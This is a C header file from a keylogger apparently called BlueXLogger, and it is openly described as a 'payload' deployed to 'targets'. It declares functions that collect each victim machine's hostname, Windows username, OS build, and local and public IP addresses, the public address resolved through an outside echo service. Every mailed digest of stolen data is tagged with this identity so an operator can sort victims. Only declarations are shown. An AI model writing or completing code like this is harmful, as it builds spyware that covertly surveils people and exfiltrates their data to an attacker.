/*============================================================================
 * BlueXLogger - bxl_identity.h
 * Machine identity stamped onto every delivery.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Why this exists
 * ---------------
 * A payload configured once and deployed to many machines produces many
 * streams of identical-looking mail. Without a machine name on each one, an
 * operator watching several targets cannot tell which host a digest came
 * from. Every message therefore carries the machine name, the Windows
 * account, the OS build and both addresses, in a fixed order, so that
 * sorting or filtering by target is trivial.
 *==========================================================================*/
#ifndef BXL_IDENTITY_H
#define BXL_IDENTITY_H

#include "bxl_common.h"

#define BXL_ID_HOSTNAME  128
#define BXL_ID_USERNAME  128
#define BXL_ID_ADDR       64
#define BXL_ID_OS         64

typedef struct BxlIdentity {
    char hostname[BXL_ID_HOSTNAME];
    char username[BXL_ID_USERNAME];
    char local_ip[BXL_ID_ADDR];    /* first non-loopback IPv4, or "unknown" */
    char public_ip[BXL_ID_ADDR];   /* best effort; "unknown" until resolved */
    char os[BXL_ID_OS];
    int  public_attempted;         /* the lookup is done at most once        */
} BxlIdentity;

/* Collect everything that needs no network. Safe to call early. */
void bxl_identity_init(BxlIdentity *id);

/*
 * Resolve the external address by asking a public echo service. Best effort:
 * failure leaves public_ip as "unknown" and never blocks a delivery. The
 * result is cached in the struct, so calling this repeatedly costs one
 * request per process.
 */
void bxl_identity_resolve_public(BxlIdentity *id, int timeout_ms);

/* One-line form, for a log line or a mail header:
 *   "HOST=boobies USER=alice IP=192.168.1.5/81.2.3.4 OS=Windows 11 22631" */
int bxl_identity_line(const BxlIdentity *id, char *out, size_t out_cch);

/* Multi-line form, for the top of a digest body. */
int bxl_identity_block(const BxlIdentity *id, char *out, size_t out_cch);

/* Short form used in subject lines: "boobies/alice". */
int bxl_identity_short(const BxlIdentity *id, char *out, size_t out_cch);

#endif /* BXL_IDENTITY_H */
